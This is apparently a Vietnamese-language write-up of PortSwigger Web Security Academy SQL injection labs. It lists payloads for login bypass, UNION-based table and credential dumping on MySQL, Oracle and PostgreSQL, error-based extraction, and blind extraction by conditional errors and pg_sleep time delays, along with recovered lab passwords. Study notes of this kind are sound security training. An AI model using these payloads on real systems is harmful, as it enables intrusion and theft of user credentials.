# 1. LAB #



# 1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data #

Mục tiêu của bài này là hiển thị hết các sản phẩm ẩn

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

`https://...web-security-academy.net/filter?category=Pets`
 Ta sẽ thêm `'OR 1=1'` đằng sau, vì điều kiện luôn đúng nên SQL sẽ trả về hết sản phẩm
 Hoặc
 `'UNION SELECT * FROM products--`

# 2.Lab: SQL injection vulnerability allowing login bypass

Input `username`: `administrator'--` để bypass password đằng sau

# 3. Lab: SQL injection UNION attack, determining the number of columns returned by the query

Dò đến khi nào trang web hiển thị hợp lệ như bình thường để biết được database có bao nhiêu 
`https://....web-security-academy.net/filter?category=Gifts'union select null,null,null--`

# 4. Lab: SQL injection UNION attack, finding a column containing text

Đầu tiên ta tìm số cột

`https://...web-security-academy.net/filter?category=Pets'union select null,null,null--`

Có 3 cột
String cần tìm nằm ở cột 2

`https://...web-security-academy.net/filter?category=Pets'union select null,'a',null--`


<img width="458" height="149" alt="image" src="https://github.com/user-attachments/assets/3bd254f1-0056-4e14-bb25-1a0137784e13" />

`https://0a7e008404f6ae158040b21300a4004c.web-security-academy.net/filter?category=Pets'union select null,'T99fsn',null--`

<img width="366" height="129" alt="image" src="https://github.com/user-attachments/assets/275f26b9-8817-4f9b-b2d7-cffe5a5641fc" />

# 5. Lab: SQL injection UNION attack, retrieving multiple values in a single column

Đầu tiên ta sẽ dò số cột, được kết quả là 2 cột

`https://...web-security-academy.net/filter?category=Gifts'union select null,null--`

Sau đó sẽ dò xem cột nào có cùng data type với username, password --> cột số 2

`https://....web-security-academy.net/filter?category=Gifts%27union%20select%20null,%27a%27--`

Thông tin mình cần là gồm 2 giá trị nhưng lại chỉ có 1 cột nên ta sẽ dùng string concatenation để nối chuỗi và trả về trong 1 cột

<img width="902" height="339" alt="image" src="https://github.com/user-attachments/assets/5ec17977-8273-4385-b72f-c240632c1346" />

`administrator~rt133x6yio2m9ksjjnqz`

# 6. Lab: SQL injection attack, querying the database type and version on Oracle

Ta thử dò số cột bằng cách dùng `UNION SELECT NULL,...` nhưng đều trả về lỗi 
Vậy nên ta sẽ lấy thông tin version bằng cách truy vấn thẳng vào một bảng nào đó

Ta sẽ thử select database và version từ bảng v$version

<img width="457" height="163" alt="image" src="https://github.com/user-attachments/assets/598a1375-5470-448f-8efc-0ac10aae8a3e" />

Vậy là trong bảng v$version có 2 cột

<img width="926" height="323" alt="image" src="https://github.com/user-attachments/assets/703faac2-7506-4c87-a24b-76ed53a25021" />

`Accessories' union select banner, null from v$version--`

<img width="543" height="244" alt="image" src="https://github.com/user-attachments/assets/3f929f93-57a2-49cb-9c1c-16415d0b660d" />

# 7. Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

Vẫn như bài trên, ta sẽ dò số cột 

Thử `'union+select+null,null--` và thay đổi số lượng cột đều lỗi, tương tự với `'union+select+null,null#`
Nhưng để y rằng dấu `#` chưa được encode

<img width="193" height="35" alt="image" src="https://github.com/user-attachments/assets/759feaea-74d6-4daf-86b4-6869bdb9cc0b" />

Encode `#` thành `%23` --> `%27+union+select+null,%20null%23` 

<img width="911" height="310" alt="image" src="https://github.com/user-attachments/assets/ddf1b52d-9a12-490f-91aa-e39379a14b6c" />

Để trả về thông tin version `%27+union+select+@@version,%20null%23` 

<img width="284" height="206" alt="image" src="https://github.com/user-attachments/assets/69633792-2789-4d69-9949-b1c71fd646a0" />

# 8. Lab: SQL injection attack, listing the database contents on non-Oracle databases

Ngoại trừ Oracle, có một bảng chứa các thông tin tổng là `information_schema.tables`

`%27+union+select+null,null+from+information_schema.tables--`

<img width="924" height="311" alt="image" src="https://github.com/user-attachments/assets/684d6b34-cfa7-4172-817f-02f0037656d4" />

Vì ta không biết tên bảng chứa thông tin username, password nên sẽ phải sử dụng truy vấn trả về các bảng

`%27+union+select+TABLE_NAME,null+from+information_schema.tables--`

<img width="270" height="359" alt="image" src="https://github.com/user-attachments/assets/e8015003-ba16-446c-855b-b805a2bb45fc" />

`%27+union+select+COLUMN_NAME,null+from+information_schema.columns+where+table_name='users_vocvkc'--`

<img width="278" height="95" alt="image" src="https://github.com/user-attachments/assets/65c58e94-3dbd-4dc5-aac8-8fb51a56a3e8" />

`%27+union+select+username_zxzlui,password_muvfas+from+users_vocvkc--`

<img width="240" height="50" alt="image" src="https://github.com/user-attachments/assets/78715846-d2a5-40cc-943e-8ccce80e64e3" />

# 9. Lab: SQL injection attack, listing the database contents on Oracle

Xác định số cột
`%27union+select+null,null+from+all_tables--`

Xác định các bảng `%27union+select+table_name,null+from+all_tables--`

<img width="331" height="191" alt="image" src="https://github.com/user-attachments/assets/ad424c13-4071-4a78-8421-8f3b311e8207" />

Xác định các cột `%27union+select+column_name,null+from+all_tab_columns+where+table_name=%27USERS_DLHIZI%27--`

<img width="217" height="392" alt="image" src="https://github.com/user-attachments/assets/67bb57f3-9493-43d1-b1dc-39cb37f97eb5" />

`%27union+select+PASSWORD_SUFMQR,USERNAME_LYMUQJ+from+USERS_DLHIZI--`

<img width="236" height="48" alt="image" src="https://github.com/user-attachments/assets/eb23fe2a-6ecf-4cb0-920a-62460dab84f7" />

# 10. Lab: SQL injection UNION attack, retrieving data from other tables

%27union+select+username,password+from+users--

<img width="200" height="48" alt="image" src="https://github.com/user-attachments/assets/22870294-ab41-40fd-8074-d0aadf400c74" />

# 11. Lab: Blind SQL injection with conditional errors #

Ta thử thêm dấu `'` vào sau TrackingId

<img width="554" height="43" alt="image" src="https://github.com/user-attachments/assets/82db9671-54e0-4c38-904e-f8e0007dc268" />

Hiện thông báo lỗi, ta thử thêm `''` thì request hợp lệ

<img width="608" height="47" alt="image" src="https://github.com/user-attachments/assets/76f6b929-ff5a-48b1-ac01-b8c9b63ea40b" />

Request chạy hợp lệ là do như sau 
```
SELECT *
FROM tracking
WHERE id = 'xyz''';
```
2 dấu nháy đơn liền nhau nằm trong chuỗi được hiểu là một dấu nháy đơn thuộc nội dung chuỗi, chứ không phải hai dấu nháy dùng để đóng và mở chuỗi độc lập

Thử test SQL tại đây

TrackingId=...'||(SELECT '')||'

<img width="692" height="38" alt="image" src="https://github.com/user-attachments/assets/d2588413-e85d-4b8d-8548-853970ac6f0a" />

Có thể là sai csdl --> thử bảng dual từ oracle   

<img width="551" height="36" alt="image" src="https://github.com/user-attachments/assets/a3dbf5ac-1bd8-41c7-9ee0-0c7dfc7e122d" />

Ta thử select vào bảng `users` và thêm  `ROWNUM=1` để tránh lỗi

<img width="614" height="62" alt="image" src="https://github.com/user-attachments/assets/043e7965-e593-4cdd-a954-1209afa392e9" />

Tiếp theo ta sẽ test hành vi dựa trên hàm điều kiện  

`TrackingId=...'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

Kiểm tra điều kiện `1=1` luôn đúng, `THEN TO_CHAR(1/0)` ếu đúng, thực hiện biểu thức chuyển kết quả phép chia thành chuỗi, `ELSE ''` nếu sai trả về chuỗi rỗng

<img width="725" height="51" alt="image" src="https://github.com/user-attachments/assets/dee56974-d4b4-4d6e-afff-55ed154b21e4" />

Thử `TrackingId=...'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

<img width="619" height="39" alt="image" src="https://github.com/user-attachments/assets/4c00fd8c-08bc-444c-8344-4768cfb20120" />

--> Lỗi biến mất. Ta có thể chủ động kích hoạt lỗi của dựa trên tính đúng sai của 1 điều kiện 

Giờ ta sẽ kiểm tra xem người dùng có tên administrator có tồn tại hay không

`TrackingId=...'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

Xác nhận có username này 

<img width="661" height="62" alt="image" src="https://github.com/user-attachments/assets/8fea73d5-33e0-4344-a4a9-a239571a7835" />

Tiếp theo ta sẽ xác định độ dài mật khẩu `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

Ta được kết quả là password có 20 kí tự

<img width="485" height="110" alt="image" src="https://github.com/user-attachments/assets/cf4c1163-a952-419c-b50c-f4e925f95b24" />

Tiếp theo ta xác định từng kí tự ở từng vị trí trong password `TrackingId=...'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

Các response 500 là kết quả ta cần tìm 

<img width="360" height="171" alt="image" src="https://github.com/user-attachments/assets/5bb5be42-116a-40dc-bd1b-38a17d1a01a0" />

Ghép lại ta được password là: `4j4zvym1lmtha7wkyfc2`

# 12. Lab: Visible error-based SQL injection #

Thêm dấu nháy đơn `'` và sau TrackingId, response trả về lỗi 

 <img width="648" height="40" alt="image" src="https://github.com/user-attachments/assets/5ee9b500-1062-4baf-892b-d567aa341a31" />

Thêm `'--`
<img width="676" height="54" alt="image" src="https://github.com/user-attachments/assets/7bc2656b-2e75-447d-a16a-55bc4b0da205" />

Thêm một truy vấn con SELECT tổng quát và ép kiểu giá trị trả về thành kiểu dữ liệu int `TrackingId=...' AND CAST((SELECT 1) AS int)--`

<img width="831" height="201" alt="image" src="https://github.com/user-attachments/assets/7e3a737c-fc2e-4400-a589-62cb72e84248" />

Nhận được một thông báo lỗi khác, cho biết điều kiện AND phải là một biểu thức Boolean.
Điều chỉnh lại `TrackingId=...' AND 1=CAST((SELECT 1) AS int)--`

<img width="667" height="53" alt="image" src="https://github.com/user-attachments/assets/20350cfd-0d6a-4eb6-b75d-4ad375dda40f" />

Điều chỉnh câu lệnh để truy xuất tên người dùng từ csdl

<img width="899" height="215" alt="image" src="https://github.com/user-attachments/assets/cde92921-5d24-4db0-af83-4d6d74aa035f" />

Xóa giá trị ban đầu của cookie để giải phóng thêm csdl

<img width="847" height="203" alt="image" src="https://github.com/user-attachments/assets/61074db4-e57a-413d-b8ca-9f0e4e1a75bd" />

Lỗi trả về thông báo rằng query trả về nhiều hơn 1 dòng 

--> `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`

<img width="894" height="232" alt="image" src="https://github.com/user-attachments/assets/566da030-9fa7-4f2b-a5f3-8b65511cfb2f" />

Giờ ta thấy được `administrator` là người đùng đầu tiên trong bảng 

--> `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

<img width="942" height="245" alt="image" src="https://github.com/user-attachments/assets/78b0631f-2404-4bdb-b29a-e8f53b68d3de" />

# 13. Lab: Blind SQL injection with time delays #

Dùng query `TrackingId=...'||pg_sleep(10)--` để hệ thống sleep 10s

# 14. Lab: Blind SQL injection with time delays and information retrieval #

Bài này dùng csdl Postgre

Dùng `TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--` thì hệ thống mất 10s phản hồi
Đổi thành `TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--` thì hệ thống ko có delay
--> sử dụng thời gian phản hồi để xác định thông tin đúng sai

`TrackingId=...'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

Thời gian phản hồi 10s --> có username đó. Tiếp theo ta sẽ dò độ dài password 

`TrackingId=...'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

Ta được độ dài là 20

Dò tiếp kí tự dựa trên thời gian response 

`TrackingId=...'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

# 15. Lab: Blind SQL injection with out-of-band interaction #







# 2. NOTE #

# 1. Sự khác biệt giữa 2 bảng `V$VERSION` và `V$INSTANCE`
+ V$VERSION: Phần mềm đang dùng phiên bản gì?
+ V$INSTANCE:
      ├── Instance tên gì?
      ├── Chạy trên host nào?
      ├── Version gì?
      ├── Trạng thái hiện tại?
      └── Khởi động lúc nào?


  

